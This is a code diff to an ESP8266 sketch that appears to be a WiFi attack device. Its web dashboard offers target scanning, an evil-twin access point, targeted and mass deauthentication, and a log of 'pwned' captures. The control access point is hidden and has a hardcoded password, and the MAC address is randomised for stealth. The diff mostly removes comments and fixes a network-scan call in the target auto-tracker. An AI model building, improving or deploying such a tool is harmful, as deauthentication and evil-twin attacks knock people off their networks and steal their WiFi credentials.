@@ -9,12 +9,10 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// Konfigurasi OLED 0.66"
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
 ESP8266WebServer server(80);
 DNSServer dnsServer;
 
-// Variabel Kontrol
 bool isAttacking = false;
 bool isEvilTwinActive = false;
 bool isHidden = true; 
@@ -25,7 +23,6 @@ int pwnCount = 0;
 String apSSID = "GMpro";
 String apPASS = "sangkur87";
 
-// Fungsi Identitas Siluman (Random MAC)
 void randomizeMAC() {
   uint8_t mac[6] = {0x00, 0x16, 0x3E, (uint8_t)random(0xff), (uint8_t)random(0xff), (uint8_t)random(0xff)};
   wifi_set_macaddr(SOFTAP_IF, mac);
@@ -49,17 +46,13 @@ void setup() {
   Serial.begin(115200);
   pinMode(2, OUTPUT); 
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
-  
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   randomizeMAC(); 
-  
-  // Start WiFi Kontrol
   WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
   dnsServer.start(53, "*", WiFi.softAPIP());
   updateOLED(isHidden ? "GHOST" : "READY");
 
-  // --- DASHBOARD ---
   server.on("/", []() {
     String s = "<html><head><meta http-equiv='refresh' content='7'><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
     s += "body{background:#000;color:#0f0;font-family:monospace;padding:10px;}";
@@ -72,12 +65,10 @@ void setup() {
     s += "<div style='border:1px solid #333;padding:10px;margin-bottom:10px;'>";
     s += "TARGET: " + (target_ssid=="" ? "NONE" : target_ssid) + "<br>";
     s += "CH: " + String(target_ch) + " | ATK: " + (isAttacking?"<b style='color:red;'>RUNNING</b>":"IDLE") + "</div>";
-    
     s += "<a href='/scan' class='b'>[1] SCAN TARGET</a>";
     s += "<a href='/eviltwin' class='b " + String(isEvilTwinActive?"active":"") + "' style='color:#0ff;'>[2] EVIL TWIN</a>";
     s += "<a href='/attack' class='b " + String(isAttacking && target_ssid != "ALL"?"active":"") + "' style='color:#f44;'>[3] DEAUTH TARGET</a>";
     s += "<a href='/mass' class='b " + String(target_ssid == "ALL"?"active":"") + "' style='color:#f0f;'>[4] MASS DEAUTH</a>";
-    
     s += "<h3>PWN LOGS ("+String(pwnCount)+"):</h3><div style='background:#111;padding:10px;font-size:11px;border:1px solid #333;height:100px;overflow-y:auto;'>" + (logs=="" ? "LISTENING..." : logs) + "</div>";
     s += "</body></html>";
     server.send(200, "text/html", s);
@@ -163,10 +154,10 @@ void loop() {
       wifi_set_channel(ch);
       ch = (ch % 13) + 1;
     } else {
-      // AUTO-TRACKER
+      // PERBAIKAN DI SINI: scanNetworks(false)
       static unsigned long lastCheck = 0;
       if (millis() - lastCheck > 6000) {
-        int n = WiFi.scanNetworks(true, true);
+        int n = WiFi.scanNetworks(false); // Pakai satu parameter saja
         for (int i = 0; i < n; i++) {
           if (WiFi.SSID(i) == target_ssid && WiFi.channel(i) != target_ch) {
             target_ch = WiFi.channel(i);
